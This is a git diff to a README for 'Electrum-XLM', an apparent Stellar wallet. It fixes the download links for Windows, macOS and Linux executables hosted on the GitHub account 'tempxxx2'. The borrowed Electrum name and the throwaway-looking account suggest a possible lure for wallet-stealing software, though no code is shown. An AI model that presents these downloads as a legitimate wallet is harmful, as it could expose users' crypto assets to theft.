@@ -16,13 +16,14 @@
 Get the latest version of **Electrum-XLM** for your operating system and start managing your Stellar (XLM) assets today:
 
 ### 🌐 **Windows**:
-[**Download Electrum-XLM for Windows**]([https://github.com/tempxxx2/Electrum-XLM/releases/tag/v1.0.0](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.exe))
-#
+[**Download Electrum-XLM for Windows**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.exe)
+
 ### 🍏 **macOS**:
-[**Download Electrum-XLM for macOS**]([https://github.com/tempxxx2/Electrum-XLM/releases/tag/v1.0.0](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.dmg))
-#
+[**Download Electrum-XLM for macOS**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.dmg)
+
 ### 🐧 **Linux**:
-[**Download Electrum-XLM for Linux**]([https://github.com/tempxxx2/Electrum-XLM/releases/tag/v1.0.0](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.AppImage))
+[**Download Electrum-XLM for Linux**](https://github.com/tempxxx2/Electrum-XLM/releases/download/v.1.4.7/electrum-xlm-1.4.7.AppImage)
+
 
 ---
 
